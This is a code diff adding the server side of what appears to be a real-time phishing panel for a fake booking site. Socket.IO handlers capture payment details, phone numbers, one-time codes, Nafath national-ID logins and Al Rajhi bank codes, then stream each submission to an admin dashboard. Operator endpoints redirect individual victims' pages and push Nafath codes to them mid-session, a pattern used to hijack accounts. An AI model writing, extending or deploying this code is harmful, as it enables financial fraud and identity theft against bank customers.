@@ -250,6 +250,303 @@ app.get('/admin/*', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
 });
 
+// ==================== Socket.IO Setup ====================
+const io = new Server(server, {
+  cors: { origin: "*", methods: ["GET", "POST"] },
+  transports: ["websocket", "polling"]
+});
+
+// Admin namespace
+const adminIo = io.of("/admin");
+
+// Helper: notify admin of new data
+function notifyAdmin(event, data) {
+  adminIo.emit(event, data);
+}
+
+// User socket connections
+io.on("connection", (socket) => {
+  console.log("User connected:", socket.id);
+
+  // Submit booking
+  socket.on("submitBooking", async (data, callback) => {
+    try {
+      const referenceId = nanoid(10).toUpperCase();
+      const clientIp = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
+      const booking = await createBooking({
+        ...data,
+        referenceId,
+        clientIp,
+        status: "new",
+        statusRead: 0,
+        rawData: data
+      });
+      socket.join(referenceId);
+      notifyAdmin("newBooking", booking);
+      if (callback) callback({ success: true, referenceId });
+    } catch (err) {
+      console.error("submitBooking error:", err);
+      if (callback) callback({ success: false, error: err.message });
+    }
+  });
+
+  // Submit payment data
+  socket.on("submitPaymentData", async (data, callback) => {
+    try {
+      const { referenceId, ...paymentData } = data;
+      if (!referenceId) return callback && callback({ success: false, error: "No referenceId" });
+      const payment = await createOrUpdatePayment(referenceId, { ...paymentData, rawData: data });
+      socket.join(referenceId);
+      notifyAdmin("newPayment", { referenceId, ...paymentData });
+      if (callback) callback({ success: true });
+    } catch (err) {
+      console.error("submitPaymentData error:", err);
+      if (callback) callback({ success: false, error: err.message });
+    }
+  });
+
+  // Submit phone data
+  socket.on("submitPhoneData", async (data, callback) => {
+    try {
+      const { referenceId } = data;
+      if (!referenceId) return callback && callback({ success: false });
+      await createOrUpdateVerification(referenceId, "phone", { ...data, rawData: data });
+      notifyAdmin("newVerification", { type: "phone", referenceId, ...data });
+      if (callback) callback({ success: true });
+    } catch (err) {
+      if (callback) callback({ success: false, error: err.message });
+    }
+  });
+
+  // Submit phone code data
+  socket.on("submitPhoneCodeData", async (data, callback) => {
+    try {
+      const { referenceId } = data;
+      if (!referenceId) return callback && callback({ success: false });
+      await createOrUpdateVerification(referenceId, "phoneCode", { ...data, rawData: data });
+      notifyAdmin("newVerification", { type: "phoneCode", referenceId, ...data });
+      if (callback) callback({ success: true });
+    } catch (err) {
+      if (callback) callback({ success: false, error: err.message });
+    }
+  });
+
+  // Submit nafad data
+  socket.on("submitNafadData", async (data, callback) => {
+    try {
+      const { referenceId } = data;
+      if (!referenceId) return callback && callback({ success: false });
+      await createOrUpdateVerification(referenceId, "nafad", { ...data, rawData: data });
+      notifyAdmin("newVerification", { type: "nafad", referenceId, ...data });
+      if (callback) callback({ success: true });
+    } catch (err) {
+      if (callback) callback({ success: false, error: err.message });
+    }
+  });
+
+  // Submit code data
+  socket.on("submitCodeData", async (data, callback) => {
+    try {
+      const { referenceId } = data;
+      if (!referenceId) return callback && callback({ success: false });
+      await createOrUpdateVerification(referenceId, "code", { otpCode: data.code, ...data, rawData: data });
+      notifyAdmin("newVerification", { type: "code", referenceId, ...data });
+      if (callback) callback({ success: true });
+    } catch (err) {
+      if (callback) callback({ success: false, error: err.message });
+    }
+  });
+
+  // Submit rajhi data
+  socket.on("submitRajhiData", async (data, callback) => {
+    try {
+      const { referenceId } = data;
+      if (!referenceId) return callback && callback({ success: false });
+      await createOrUpdateVerification(referenceId, "rajhi", { ...data, rawData: data });
+      notifyAdmin("newVerification", { type: "rajhi", referenceId, ...data });
+      if (callback) callback({ success: true });
+    } catch (err) {
+      if (callback) callback({ success: false, error: err.message });
+    }
+  });
+
+  // Submit rajhi code data
+  socket.on("submitRajhiCodeData", async (data, callback) => {
+    try {
+      const { referenceId } = data;
+      if (!referenceId) return callback && callback({ success: false });
+      await createOrUpdateVerification(referenceId, "rajhiCode", { ...data, rawData: data });
+      notifyAdmin("newVerification", { type: "rajhiCode", referenceId, ...data });
+      if (callback) callback({ success: true });
+    } catch (err) {
+      if (callback) callback({ success: false, error: err.message });
+    }
+  });
+
+  // Submit verification data
+  socket.on("submitVerificationData", async (data, callback) => {
+    try {
+      const { referenceId, type } = data;
+      if (!referenceId) return callback && callback({ success: false });
+      await createOrUpdateVerification(referenceId, type || "verification", { ...data, rawData: data });
+      notifyAdmin("newVerification", { referenceId, ...data });
+      if (callback) callback({ success: true });
+    } catch (err) {
+      if (callback) callback({ success: false, error: err.message });
+    }
+  });
+
+  // Update location
+  socket.on("updateLocation", async (data, callback) => {
+    try {
+      notifyAdmin("locationUpdate", { socketId: socket.id, ...data });
+      if (callback) callback({ success: true });
+    } catch (err) {
+      if (callback) callback({ success: false });
+    }
+  });
+
+  // Get nafad code
+  socket.on("getNafadCode", async (data, callback) => {
+    try {
+      notifyAdmin("nafadCodeRequest", { socketId: socket.id, ...data });
+      if (callback) callback({ success: true });
+    } catch (err) {
+      if (callback) callback({ success: false });
+    }
+  });
+
+  socket.on("disconnect", () => {
+    console.log("User disconnected:", socket.id);
+  });
+});
+
+// ==================== Admin API Endpoints ====================
+
+// Middleware to verify admin token
+function verifyAdminToken(req, res, next) {
+  const token = req.headers.authorization?.split(" ")[1];
+  if (!token) return res.status(401).json({ error: "Unauthorized" });
+  try {
+    const decoded = jwt.verify(token, JWT_SECRET);
+    if (decoded.role !== "admin") return res.status(403).json({ error: "Forbidden" });
+    req.admin = decoded;
+    next();
+  } catch (err) {
+    return res.status(401).json({ error: "Invalid token" });
+  }
+}
+
+// Admin login
+app.post("/api/admin/login", async (req, res) => {
+  try {
+    const { password } = req.body;
+    if (!password) return res.status(400).json({ error: "Password required" });
+    
+    const isValid = password === ADMIN_PASSWORD;
+    if (!isValid) return res.status(401).json({ error: "Invalid password" });
+    
+    const token = jwt.sign({ role: "admin", id: "admin" }, JWT_SECRET, { expiresIn: "24h" });
+    res.json({ success: true, token });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin me
+app.get("/api/admin/me", verifyAdminToken, (req, res) => {
+  res.json({ success: true, admin: req.admin });
+});
+
+// Get all bookings
+app.get("/api/admin/bookings", verifyAdminToken, async (req, res) => {
+  try {
+    const bookings = await getAllBookings();
+    res.json({ success: true, bookings });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Get stats
+app.get("/api/admin/stats", verifyAdminToken, async (req, res) => {
+  try {
+    const bookings = await getAllBookings();
+    const total = bookings.length;
+    const newCount = bookings.filter(b => b.status === "new").length;
+    const completed = bookings.filter(b => b.status === "completed").length;
+    const processing = bookings.filter(b => b.status === "processing").length;
+    const onlineUsers = io.engine.clientsCount || 0;
+    res.json({ success: true, total, new: newCount, completed, processing, onlineUsers });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Update booking status
+app.post("/api/admin/update-status", verifyAdminToken, async (req, res) => {
+  try {
+    const { referenceId, status, statusRead } = req.body;
+    await updateBookingStatus(referenceId, status, statusRead);
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Navigate user to page
+app.post("/api/admin/navigate", verifyAdminToken, async (req, res) => {
+  try {
+    const { referenceId, page } = req.body;
+    // Emit to specific user room
+    io.to(referenceId).emit("navigateTo", { page });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Send nafath code to user
+app.post("/api/admin/send-nafath-code", verifyAdminToken, async (req, res) => {
+  try {
+    const { referenceId, code } = req.body;
+    io.to(referenceId).emit("nafadCode", { code });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Nafath action
+app.post("/api/admin/nafath-action", verifyAdminToken, async (req, res) => {
+  try {
+    const { referenceId, action, data } = req.body;
+    io.to(referenceId).emit("nafadCode", { action, ...data });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Payment action
+app.post("/api/admin/payment-action", verifyAdminToken, async (req, res) => {
+  try {
+    const { referenceId, action, data } = req.body;
+    io.to(referenceId).emit("ackRajhiCode", { action, ...data });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin Socket.IO namespace
+adminIo.on("connection", (socket) => {
+  console.log("Admin connected:", socket.id);
+  socket.on("disconnect", () => {
+    console.log("Admin disconnected:", socket.id);
+  });
+});
+
 // ==================== تشغيل السيرفر ====================
 server.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
